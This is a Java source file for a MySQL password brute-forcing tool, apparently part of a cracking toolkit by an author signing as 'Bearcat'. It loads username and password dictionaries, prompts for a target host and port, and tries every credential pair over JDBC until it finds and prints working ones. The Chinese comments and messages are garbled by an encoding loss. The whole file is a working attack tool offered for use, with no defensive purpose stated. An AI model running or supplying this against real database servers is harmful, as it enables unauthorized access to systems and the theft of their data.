package MysqlDbBlasting;

import java.io.IOException;
import java.io.InputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Scanner;

import util.IpOrPortIsOnline;
import util.Time;

/**
 * Mysql�˺������ƽ�ģ��
 * 
 * @author Bearcat Mail:hacker.bear.cat@qq.com
 * @since JDK 1.8
 * @version 1.0 2017-04-2
 */
public class MySQLScript {
	
	static String[] dbUsername = {}; // mysql�˺��ֵ�����
	static String[] dbPassword = {}; // mysql�����ֵ�����

	// Mysql�û����ֵ�
	public static void username() throws IOException {
		InputStream file = MySQLScript.class.getResourceAsStream("username.CrackDb");
		byte[] rbs = new byte[9999];
		file.read(rbs);
		String str = new String(rbs);
		//System.getProperty("line.separator")����ϵͳƽ̨�õ����з�
		dbUsername = str.split(System.getProperty("line.separator"));
	}

	// Mysql�����ֵ�
	public static void password() throws IOException {
		InputStream file = MySQLScript.class.getResourceAsStream("password.CrackDb");
		byte[] rbs = new byte[999999];
		file.read(rbs);
		String str = new String(rbs);
		//System.getProperty("line.separator")����ϵͳƽ̨�õ����з�
		dbPassword = str.split(System.getProperty("line.separator"));
	}

	public static void Mysql(String dbUsernames) {
		String dbHost = null; // mysql���ݿ��ַ
		int dbPort = 0; // mysql���ݿ�˿�
		System.out.print("===========================================================================\n");
		System.out.print("\t\t\tMysql�˺����뱬��ģ��\n");
		System.out.print("===========================================================================\n");
		System.out.print("Mysql-DB-Host-IP:");
		dbHost = new Scanner(System.in).nextLine();
		System.out.print("Port:");
		dbPort = new Scanner(System.in).nextInt();
		// �ж�Mysql���ݿ������Ƿ�����
		if (IpOrPortIsOnline.isPing(dbHost)) {
			// �ж�Mysql���ݿ������˿��Ƿ��
			if (IpOrPortIsOnline.isHostConnectable(dbHost, dbPort)) {
				
				// ��ʼ���ֵ�
				try {
					username();
					password();
				} catch (IOException e1) {
					System.out.println("�ֵ����ʧ��");
				}
				
				try {
					Class.forName("com.mysql.jdbc.Driver");
				} catch (ClassNotFoundException e) {
					System.out.println("mysql-jdbc.jar  Non-existent?");
				}

				Connection conn = null;
				
				if(dbUsernames.equals("username.CrackDb")){
					System.out.print("==================================��ʼ����==================================\n");
					OK: for (int username = 0; username < dbUsername.length; username++) {
							for (int password = 0; password < dbPassword.length; password++) {
								try {
									conn = DriverManager.getConnection("jdbc:mysql://" + dbHost + ":" + dbPort+ "/mysql?useUnicode=true&characterEncoding=utf8",dbUsername[username], dbPassword[password]);
									System.err.println("\t|\t��ϲ���Ƴɹ�\t�˺ţ�" + dbUsername[username] + "\t" + "���룺" + dbPassword[password] + "\t|");
									conn.close();
									break OK;
								} catch (SQLException e) {
									System.out.println(Time.time() + " [INFO] " + (dbUsername.length + dbPassword.length - username - password) + "/username.CrackDb && password.CrackDb");
									continue;
								}
							}
						}
					System.out.print("==================================���ƽ���==================================\n");
					if (conn == null) {
						System.err.println("\t\t\t�ֵ䲻��ǿ���ƽ�δ�ܳɹ���");
					}
				}else{
					System.out.print("==================================��ʼ����==================================\n");
						for (int password = 0; password < dbPassword.length; password++) {
							try {
								conn = DriverManager.getConnection("jdbc:mysql://" + dbHost + ":" + dbPort+ "/mysql?useUnicode=true&characterEncoding=utf8",dbUsernames, dbPassword[password]);
								System.err.println("\t|\t��ϲ���Ƴɹ�\t�˺ţ�" + dbUsernames + "\t" + "���룺" + dbPassword[password] + "\t|");
								conn.close();
								break;
							} catch (SQLException e) {
								System.out.println(Time.time() + " [INFO] " + (dbPassword.length - password) + "/dbUsername:"+ dbUsernames +" && password.CrackDb");
								continue;
							}
						}
					System.out.print("==================================���ƽ���==================================\n");
					if (conn == null) {
						System.err.println("\t\t\t�ֵ䲻��ǿ���ƽ�δ�ܳɹ���");
					}
				}
			} else {
				System.err.println("\t\t\t\tĿ��Mysql�����˿ڲ���ȷ��");
			}
		} else {
			System.err.println("\t\t\tĿ��Mysql����IP��ַ����(������)��");
		}
	}
}